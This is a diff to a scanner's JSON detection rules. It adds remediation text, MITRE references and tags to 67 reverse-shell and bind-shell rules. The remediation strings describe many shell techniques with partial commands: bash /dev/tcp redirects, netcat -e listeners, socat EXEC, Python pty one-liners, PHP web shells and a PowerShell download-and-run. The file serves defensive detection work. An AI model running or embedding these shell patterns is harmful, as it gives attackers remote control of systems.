@@ -19,7 +19,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP bind shell: `php -r` opens a listening socket (socket_create/bind/listen/accept) and pipes each connection into popen() for command execution. No package or skill has a reason to embed a listener that serves a shell — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "bind-shell", "php", "socket"]
     },
     {
       "id": "RSHELL-002",
@@ -32,7 +35,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Perl bind shell: `perl -e` binds a socket with Socket, listens, and execs a shell for each accepted client. Nothing a package installs should open a shell listener; treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "bind-shell", "perl", "socket"]
     },
     {
       "id": "RSHELL-003",
@@ -45,7 +51,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Python bind shell: `python3 -c` binds 0.0.0.0, listens, and feeds received bytes to subprocess.Popen(shell=True), returning output over the socket. A package has no legitimate reason to open a shell listener — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.006"],
+      "tags": ["reverse-shell", "bind-shell", "python"]
     },
     {
       "id": "RSHELL-004",
@@ -58,7 +67,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Ruby bind shell: `ruby -rsocket -e` opens a TCPServer, accepts a client, dups stdio onto it and execs `/bin/sh -i`. No package should ship a shell listener; treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bind-shell", "ruby"]
     },
     {
       "id": "RSHELL-005",
@@ -71,7 +83,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "socat bind shell: `socat TCP-LISTEN:<port>,fork EXEC:/bin/sh,pty` serves an interactive PTY shell to anyone who connects. socat is a legitimate relay tool, but LISTEN piped to EXEC:/bin/sh is a bind backdoor — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bind-shell", "socat"]
     },
     {
       "id": "RSHELL-006",
@@ -84,7 +99,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "netcat bind shell: `nc -nlvp <port> -e /bin/sh` listens and hands `/bin/sh` to the first caller. The `-e` exec flag on a listener has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bind-shell", "netcat"]
     },
     {
       "id": "RSHELL-007",
@@ -97,7 +115,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "netcat FIFO bind shell: a named pipe (`mkfifo /tmp/f`) shuttles `/bin/sh -i` between a listening `nc` and the shell, emulating `-e` where it is unavailable. No package needs this; treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bind-shell", "netcat", "mkfifo"]
     },
     {
       "id": "RSHELL-008",
@@ -110,7 +131,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Windows netcat bind shell: `nc.exe -nlvp <port> -e cmd` listens and serves `cmd.exe` to the first caller. Shipping a listener that execs a shell is a backdoor — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.003"],
+      "tags": ["reverse-shell", "bind-shell", "netcat", "windows"]
     },
     {
       "id": "RSHELL-009",
@@ -123,7 +147,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "ncat bind shell: `ncat -nlvp <port> -e /bin/sh` listens and hands `/bin/sh` to whoever connects. The `-e` exec flag on a listener has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bind-shell", "ncat"]
     },
     {
       "id": "RSHELL-010",
@@ -136,7 +163,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "gawk reverse shell: an `awk 'BEGIN{...}'` one-liner opens `/inet/tcp/0/<host>/<port>` and loops a `shell>` prompt, executing received commands and returning output. No package drives gawk network sockets this way — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "awk"]
     },
     {
       "id": "RSHELL-011",
@@ -149,7 +179,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Bash reverse shell: `bash -i >& /dev/tcp/<host>/<port> 0>&1` redirects an interactive shell over Bash's built-in `/dev/tcp` pseudo-device to a remote listener. This has no legitimate use in a package — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bash", "dev-tcp"]
     },
     {
       "id": "RSHELL-012",
@@ -162,7 +195,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Bash reverse shell: file descriptor 196 is bound to `/dev/tcp/<host>/<port>` with `exec 196<>` and an interactive shell is wired to it. The `/dev/tcp` connect-back has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bash", "dev-tcp"]
     },
     {
       "id": "RSHELL-013",
@@ -175,7 +211,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Bash reverse shell: `sh -i 5<> /dev/tcp/<host>/<port>` opens fd 5 to a remote host and redirects the interactive shell's stdio onto it. No package legitimately connects a shell to `/dev/tcp` — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bash", "dev-tcp"]
     },
     {
       "id": "RSHELL-014",
@@ -188,7 +227,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Bash reverse shell: `exec 5<>/dev/tcp/<host>/<port>` then a `while read line; do $line` loop executes commands streamed from the socket. This connect-back command loop has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bash", "dev-tcp"]
     },
     {
       "id": "RSHELL-015",
@@ -201,7 +243,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Bash reverse shell (UDP): `sh -i >& /dev/udp/<host>/<port> 0>&1` redirects an interactive shell over Bash's `/dev/udp` pseudo-device. No package legitimately connects a shell to `/dev/udp` — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "bash", "dev-udp"]
     },
     {
       "id": "RSHELL-016",
@@ -214,7 +259,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "BusyBox netcat reverse shell: `busybox nc <host> <port> -e <shell>` connects back and hands the shell to the listener. The `-e` exec-on-connect has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "netcat", "busybox"]
     },
     {
       "id": "RSHELL-017",
@@ -227,7 +275,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "C reverse shell (source): a small C program creates a socket, `connect()`s to a hard-coded host/port, dup2()s the descriptor onto stdin/stdout/stderr and `execvp`s a shell. Compiled connect-back shell source has no place in a package — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "c"]
     },
     {
       "id": "RSHELL-018",
@@ -240,7 +291,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "C reverse shell (Windows source): a WinSock program connects to a hard-coded host/port and starts a shell process wired to the socket via STARTUPINFO. Compiled connect-back shell source has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.003"],
+      "tags": ["reverse-shell", "c", "windows"]
     },
     {
       "id": "RSHELL-019",
@@ -253,7 +307,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "C# reverse shell: a `System.Diagnostics.Process` runs `bash -c \"... >& /dev/tcp/<host>/<port>\"`, launching a Bash `/dev/tcp` reverse shell. The embedded connect-back is malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "csharp", "dev-tcp"]
     },
     {
       "id": "RSHELL-020",
@@ -266,7 +323,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "C# reverse shell: a `TcpClient` connects to a hard-coded host/port and a `Process` shell reads commands from and writes output to the stream. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "csharp"]
     },
     {
       "id": "RSHELL-021",
@@ -279,7 +339,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Crystal reverse shell: `Socket.tcp` connects to a hard-coded host/port and loops, running received strings through `Process.new(..., shell:true)` and returning output. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "crystal"]
     },
     {
       "id": "RSHELL-022",
@@ -292,7 +355,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Crystal reverse shell: `crystal eval` compiles and runs a one-liner that connects a socket to a hard-coded host/port and executes received commands. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "crystal"]
     },
     {
       "id": "RSHELL-023",
@@ -305,7 +371,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Dart reverse shell: `Socket.connect(host, port)` streams received data into `Process.start()` and writes the command output back over the socket. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "dart"]
     },
     {
       "id": "RSHELL-024",
@@ -318,7 +387,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Go reverse shell (dropper): a one-liner is echoed to `/tmp/t.go`, run with `go run`, then deleted; the program imports `os/exec` and `net` to connect back and spawn a shell. Writing, compiling and deleting a shell at runtime is malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "golang", "dropper"]
     },
     {
       "id": "RSHELL-025",
@@ -331,7 +403,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Groovy reverse shell: a `ProcessBuilder(cmd)` shell is bridged to a `Socket(host, port)`, pumping process I/O over the connection. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "groovy", "jvm"]
     },
     {
       "id": "RSHELL-026",
@@ -344,7 +419,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Haskell reverse shell: `System.Process.callCommand` runs a `mkfifo` + `nc <host> <port>` pipeline that connects back and serves a shell. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "haskell", "netcat", "mkfifo"]
     },
     {
       "id": "RSHELL-027",
@@ -357,7 +435,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Java reverse shell: a `Runtime.exec`/`Process` shell is wired to a `Socket`, bridging streams so a remote host drives the shell. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "java"]
     },
     {
       "id": "RSHELL-028",
@@ -370,7 +451,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Java reverse shell: `ProcessBuilder(\"bash\",\"-c\", \"$@| bash -i >& /dev/tcp/<host>/<port> 0>&1\")` launches a Bash `/dev/tcp` reverse shell. The embedded connect-back is malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "java", "dev-tcp"]
     },
     {
       "id": "RSHELL-029",
@@ -383,7 +467,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Java reverse shell: a `ProcessBuilder(cmd)` shell is connected to a `Socket(host, port)` and its input/output/error streams are pumped over the connection. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "java"]
     },
     {
       "id": "RSHELL-030",
@@ -396,7 +483,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "JSP web/reverse shell: this two-way shell runs commands from an HTTP form parameter via `Runtime.getRuntime().exec()` and also connects a socket back to a hard-coded host/port. A JSP that executes request parameters is a web shell — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1505.003"],
+      "tags": ["reverse-shell", "java", "webshell", "jsp"]
     },
     {
       "id": "RSHELL-031",
@@ -409,7 +499,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "JSP reverse shell: a `StreamConnector` bridges a `Runtime.exec` shell to a `Socket`, giving a remote host an interactive shell inside the servlet container. This connect-back web shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1505.003"],
+      "tags": ["reverse-shell", "java", "webshell", "jsp"]
     },
     {
       "id": "RSHELL-032",
@@ -422,7 +515,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Java/Nashorn reverse shell: a JavaScript string builds `java.net.Socket` + `java.lang.ProcessBuilder` and bridges a shell to a remote host, executed through the JVM script engine. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.007"],
+      "tags": ["reverse-shell", "javascript", "nashorn", "jvm"]
     },
     {
       "id": "RSHELL-033",
@@ -435,7 +531,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Lua reverse shell: `lua -e` uses LuaSocket `tcp():connect(host,port)` then `os.execute('sh -i <&3 >&3 2>&3')` to redirect a shell over the connection. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "lua"]
     },
     {
       "id": "RSHELL-034",
@@ -448,7 +547,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Lua reverse shell: `lua5.1 -e` connects a LuaSocket TCP socket to a hard-coded host/port and loops, running received commands via `io.popen` and sending output back. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "lua"]
     },
     {
       "id": "RSHELL-035",
@@ -461,7 +563,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "OpenSSL reverse shell: a `mkfifo` pipe bridges `sh -i` to `openssl s_client -connect <host>:<port>`, giving an encrypted connect-back shell. Wrapping a reverse shell in TLS does not make it legitimate — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "openssl", "mkfifo", "tls"]
     },
     {
       "id": "RSHELL-036",
@@ -474,7 +579,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP web shell (p0wny): a single-file PHP script executes attacker commands received over HTTP through exec/shell_exec/popen and returns the output. A request-driven command executor is a web shell with no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1505.003"],
+      "tags": ["reverse-shell", "php", "webshell"]
     },
     {
       "id": "RSHELL-037",
@@ -487,7 +595,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Obfuscated PHP reverse shell: emoji variable names hide `fsockopen` and an `exec` of `sh -i` redirected over the socket to a hard-coded host/port. The obfuscation itself signals intent — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php", "obfuscation", "emoji"]
     },
     {
       "id": "RSHELL-038",
@@ -500,7 +611,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell (Ivan Sincek): a multi-stage PHP script opens a socket to a hard-coded host/port with `proc_open` and pumps an interactive shell over it. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-039",
@@ -513,7 +627,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell (pentestmonkey): the classic `php-reverse-shell` opens a socket to a hard-coded IP/port with `fsockopen`, forks, and runs `sh -i` wired to the connection. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-040",
@@ -526,7 +643,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell: `php -r '$sock=fsockopen(...); `<shell> <&3 >&3 2>&3` ;'` opens a socket and runs a shell via backtick command execution redirected onto it. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-041",
@@ -539,7 +659,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP web shell: an HTML form submits a `cmd` parameter that the page executes and echoes back. A page that runs user-supplied commands is a web shell with no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1505.003"],
+      "tags": ["reverse-shell", "php", "webshell"]
     },
     {
       "id": "RSHELL-042",
@@ -552,7 +675,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP web shell: `<?php if(isset($_REQUEST[\"cmd\"]))...` executes whatever command arrives in the request. A request-driven command executor is a web shell — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1505.003"],
+      "tags": ["reverse-shell", "php", "webshell"]
     },
     {
       "id": "RSHELL-043",
@@ -565,7 +691,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP web shell (minimal): `<?=`$_GET[0]`?>` runs the first GET parameter as a shell command via backticks and prints the output. This one-line request-driven executor is a web shell — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1505.003"],
+      "tags": ["reverse-shell", "php", "webshell"]
     },
     {
       "id": "RSHELL-044",
@@ -578,7 +707,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell: `php -r '$sock=fsockopen(...);exec(\"<shell> <&3 >&3 2>&3\");'` opens a socket to a hard-coded host/port and runs a shell redirected onto it via `exec`. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-045",
@@ -591,7 +723,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell: `fsockopen` to a hard-coded host/port plus `passthru(\"<shell> <&3 >&3 2>&3\")` wires a shell to the connection. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-046",
@@ -604,7 +739,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell: `fsockopen` to a hard-coded host/port plus `popen(\"<shell> <&3 >&3 2>&3\", \"r\")` runs a shell over the socket. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-047",
@@ -617,7 +755,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell: `$s=fsockopen(...); proc_open(\"<shell>\", [$s,$s,$s], $p)` attaches a shell's stdio to a socket connected to a hard-coded host/port. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-048",
@@ -630,7 +771,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell: `fsockopen` to a hard-coded host/port plus `shell_exec(\"<shell> <&3 >&3 2>&3\")` runs a shell over the connection. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-049",
@@ -643,7 +787,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PHP reverse shell: `fsockopen` to a hard-coded host/port plus `system(\"<shell> <&3 >&3 2>&3\")` runs a shell over the connection. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "php"]
     },
     {
       "id": "RSHELL-050",
@@ -656,7 +803,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Perl reverse shell: `perl -e 'use Socket;...connect(...);'` opens a socket to a hard-coded IP/port and execs a shell wired to it. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "perl"]
     },
     {
       "id": "RSHELL-051",
@@ -669,7 +819,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Perl reverse shell (no /bin/sh): `perl -MIO -e` forks, opens an `IO::Socket::INET` to a hard-coded host:port, and runs streamed commands via `system` without spawning an intermediary shell. This connect-back executor has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "perl"]
     },
     {
       "id": "RSHELL-052",
@@ -682,7 +835,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PowerShell reverse shell: a `Net.Sockets.TCPClient` connects to a hard-coded host/port and the loop `Invoke-Expression`s received bytes, returning output over the stream. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.001"],
+      "tags": ["reverse-shell", "powershell"]
     },
     {
       "id": "RSHELL-053",
@@ -695,7 +851,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PowerShell reverse shell: `powershell -nop -c` opens a `System.Net.Sockets.TCPClient` to a hard-coded host/port and pipes read bytes through `iex`, streaming output back. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.001"],
+      "tags": ["reverse-shell", "powershell"]
     },
     {
       "id": "RSHELL-054",
@@ -708,7 +867,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PowerShell reverse shell: `powershell -nop -W hidden -noni -ep bypass -c` connects a TCPClient to a hard-coded host/port and `Invoke-Expression`s received commands. The hidden / no-profile / execution-policy-bypass flags plus connect-back mark it malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059.001"],
+      "tags": ["reverse-shell", "powershell"]
     },
     {
       "id": "RSHELL-055",
@@ -721,7 +883,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PowerShell reverse shell (base64): the base64 / `-EncodedCommand` form of the PowerShell #3 TCPClient reverse shell. Decode any `-enc` / base64 PowerShell blob before trusting it; one that reconstructs a TCPClient + Invoke-Expression loop is malicious — reject the code.",
+      "references": ["MITRE T1059.001"],
+      "tags": ["reverse-shell", "powershell", "base64"]
     },
     {
       "id": "RSHELL-056",
@@ -734,7 +899,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PowerShell reverse shell (TLS): a `TCPClient` + `SslStream` authenticates as a client (spoofing the SNI `cloudflare-dns.com`) to a hard-coded host/port and runs received commands over an encrypted channel. TLS wrapping and a decoy SNI do not make it legitimate — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.001"],
+      "tags": ["reverse-shell", "powershell", "tls"]
     },
     {
       "id": "RSHELL-057",
@@ -747,7 +915,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PowerShell reverse shell (base64): the base64 / `-EncodedCommand` form of the PowerShell #5 reverse shell (with stderr relay). Decode any `-enc` / base64 PowerShell blob; one that reconstructs a TCPClient command loop is malicious — reject the code.",
+      "references": ["MITRE T1059.001"],
+      "tags": ["reverse-shell", "powershell", "base64"]
     },
     {
       "id": "RSHELL-058",
@@ -760,7 +931,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Python reverse shell: `python -c` connects a socket to `RHOST`/`RPORT`, dup2()s it onto stdin/stdout/stderr and `pty.spawn`s a shell. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.006"],
+      "tags": ["reverse-shell", "python", "pty"]
     },
     {
       "id": "RSHELL-059",
@@ -773,7 +947,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Python reverse shell: `python -c 'import socket,subprocess,os;...connect((host,port));os.dup2(...);pty.spawn(...)'` wires a shell to a socket connected to a hard-coded host/port. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.006"],
+      "tags": ["reverse-shell", "python", "pty"]
     },
     {
       "id": "RSHELL-060",
@@ -786,7 +963,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Python3 reverse shell: `python3 -c` reads `RHOST`/`RPORT` from the environment, connects a socket, dup2()s it onto stdio and `pty.spawn`s a shell. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.006"],
+      "tags": ["reverse-shell", "python", "pty"]
     },
     {
       "id": "RSHELL-061",
@@ -799,7 +979,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Python3 reverse shell: `python3 -c 'import socket,subprocess,os;...connect((host,port));os.dup2(...);pty.spawn(...)'` redirects a shell over a socket to a hard-coded host/port. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.006"],
+      "tags": ["reverse-shell", "python", "pty"]
     },
     {
       "id": "RSHELL-062",
@@ -812,7 +995,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Python reverse shell (Windows): threads shuttle bytes between a `socket` connected to a hard-coded host/port and a `subprocess.Popen` shell (`s2p`/`p2s`), since `pty` is unavailable on Windows. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.006"],
+      "tags": ["reverse-shell", "python", "windows"]
     },
     {
       "id": "RSHELL-063",
@@ -825,7 +1011,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Python3 reverse shell (minimal): `python3 -c 'import os,pty,socket;s=socket.socket();s.connect((host,port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(...)'` connects back and hands over a PTY shell. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.006"],
+      "tags": ["reverse-shell", "python", "pty"]
     },
     {
       "id": "RSHELL-064",
@@ -838,7 +1027,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Ruby reverse shell: `ruby -rsocket -e` spawns `sh` with stdin/stdout/stderr redirected to a `TCPSocket.new(host, port)`. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "ruby"]
     },
     {
       "id": "RSHELL-065",
@@ -851,7 +1043,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Ruby reverse shell (no /bin/sh): `ruby -rsocket -e` forks, opens a `TCPSocket` to a hard-coded host/port and runs streamed commands via `IO.popen` without an intermediary shell. This connect-back executor has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "ruby"]
     },
     {
       "id": "RSHELL-066",
@@ -864,7 +1059,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "V reverse shell (dropper): a V program is written to `/tmp/t.v`, run with `v run`, then deleted; it imports `os` to connect back and spawn a shell. Writing, compiling and deleting a shell at runtime is malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "vlang", "dropper"]
     },
     {
       "id": "RSHELL-067",
@@ -877,7 +1075,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "PowerShell reverse shell (ConPtyShell): `IEX(IWR https://raw.githubusercontent.com/.../Invoke-ConPtyShell.ps1); Invoke-ConPtyShell <host> <port>` downloads and runs a fully-interactive PTY reverse shell. Fetching and executing a remote reverse-shell script is malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059.001"],
+      "tags": ["reverse-shell", "powershell", "conpty", "download"]
     },
     {
